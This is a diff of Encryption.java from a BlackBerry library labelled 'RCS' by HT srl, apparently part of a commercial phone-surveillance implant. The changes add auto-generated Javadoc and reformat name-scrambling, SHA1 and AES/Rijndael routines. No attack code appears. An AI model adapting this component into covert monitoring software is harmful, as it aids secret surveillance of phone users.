@@ -1,8 +1,8 @@
 /* *************************************************
  * Copyright (c) 2010 - 2010
  * HT srl,   All rights reserved.
- * Project      : RCS, RCSBlackBerry_lib 
- * File         : Encryption.java 
+ * Project      : RCS, RCSBlackBerry_lib
+ * File         : Encryption.java
  * Created      : 26-mar-2010
  * *************************************************/
 package blackberry.crypto;
@@ -15,7 +15,11 @@ import blackberry.utils.Debug;
 import blackberry.utils.DebugLevel;
 import blackberry.utils.Utils;
 
-public class Encryption {
+// TODO: Auto-generated Javadoc
+/**
+ * The Class Encryption.
+ */
+public final class Encryption {
 
     //#debug
     private static Debug debug = new Debug("Encryption", DebugLevel.VERBOSE);
@@ -23,6 +27,12 @@ public class Encryption {
     /**
      * Descrambla una stringa, torna il puntatore al nome descramblato. La
      * stringa ritornata va liberata dal chiamante con una free()!!!!
+     * 
+     * @param Name
+     *            the name
+     * @param seed
+     *            the seed
+     * @return the string
      */
     public static String decryptName(final String Name, final int seed) {
         return scramble(Name, seed, false);
@@ -31,11 +41,24 @@ public class Encryption {
     /**
      * Scrambla una stringa, torna il puntatore al nome scramblato. La stringa
      * ritornata va liberata dal chiamante con una free()!!!!
+     * 
+     * @param Name
+     *            the name
+     * @param seed
+     *            the seed
+     * @return the string
      */
     public static String encryptName(final String Name, final int seed) {
         return scramble(Name, seed, true);
     }
 
+    /**
+     * Gets the next multiple.
+     * 
+     * @param len
+     *            the len
+     * @return the next multiple
+     */
     public static int getNextMultiple(final int len) {
         // #ifdef DBC
         Check.requires(len >= 0, "len < 0");
@@ -111,22 +134,26 @@ public class Encryption {
 
     private static boolean RimAESSupported;
 
+    /**
+     * Inits the.
+     */
     public static void init() {
         RimAESSupported = RimAES.isSupported();
         if (RimAESSupported) {
             // #debug info
-	debug.info("RimAES");
+            debug.info("RimAES");
         } else {
             // #debug info
-	debug.info("Rijndael");
+            debug.info("Rijndael");
         }
     }
 
     /**
-     * Calcola il SHA1 del messaggio, usando la crypto api
+     * Calcola il SHA1 del messaggio, usando la crypto api.
      * 
      * @param message
-     * @return
+     *            the message
+     * @return the byte[]
      */
     public static byte[] SHA1(final byte[] message) {
         final SHA1Digest digest = new SHA1Digest();
@@ -134,10 +161,13 @@ public class Encryption {
         final byte[] sha1 = digest.getDigest();
 
         // #debug debug
-	debug.trace("SHA1: " + Utils.byteArrayToHex(sha1));
+        debug.trace("SHA1: " + Utils.byteArrayToHex(sha1));
         return sha1;
     }
 
+    /**
+     * Instantiates a new encryption.
+     */
     public Encryption() {
 
         if (RimAESSupported) {
@@ -147,14 +177,41 @@ public class Encryption {
         }
     }
 
+    /**
+     * Decrypt data.
+     * 
+     * @param cyphered
+     *            the cyphered
+     * @return the byte[]
+     */
     public byte[] decryptData(final byte[] cyphered) {
         return decryptData(cyphered, cyphered.length, 0);
     }
 
+    /**
+     * Decrypt data.
+     * 
+     * @param cyphered
+     *            the cyphered
+     * @param offset
+     *            the offset
+     * @return the byte[]
+     */
     public byte[] decryptData(final byte[] cyphered, final int offset) {
         return decryptData(cyphered, cyphered.length - offset, offset);
     }
 
+    /**
+     * Decrypt data.
+     * 
+     * @param cyphered
+     *            the cyphered
+     * @param plainlen
+     *            the plainlen
+     * @param offset
+     *            the offset
+     * @return the byte[]
+     */
     public byte[] decryptData(final byte[] cyphered, final int plainlen,
             final int offset) {
         final int enclen = cyphered.length - offset;
@@ -187,7 +244,7 @@ public class Encryption {
                 if ((i + 1 >= numblock) && (lastBlockLen != 0)) { // last turn
                     // and remaind
                     // #debug debug
-	debug.trace("lastBlockLen: " + lastBlockLen);
+                    debug.trace("lastBlockLen: " + lastBlockLen);
                     Utils.copy(plain, i * 16, pt, 0, lastBlockLen);
                 } else {
                     Utils.copy(plain, i * 16, pt, 0, 16);
@@ -206,6 +263,13 @@ public class Encryption {
         return plain;
     }
 
+    /**
+     * Encrypt data.
+     * 
+     * @param plain
+     *            the plain
+     * @return the byte[]
+     */
     public byte[] encryptData(final byte[] plain) {
         // #ifdef DBC
         Check.requires(keyReady, "Key not ready");
@@ -248,6 +312,12 @@ public class Encryption {
         return crypted;
     }
 
+    /**
+     * Make key.
+     * 
+     * @param key
+     *            the key
+     */
     public void makeKey(final byte[] key) {
         // #ifdef DBC
         Check.requires(key != null, "key null");
@@ -260,6 +330,14 @@ public class Encryption {
         keyReady = true;
     }
 
+    /**
+     * Xor.
+     * 
+     * @param pt
+     *            the pt
+     * @param iv
+     *            the iv
+     */
     void xor(final byte[] pt, final byte[] iv) {
         // #ifdef DBC
         Check.requires(pt.length == 16, "pt not 16 bytes long");
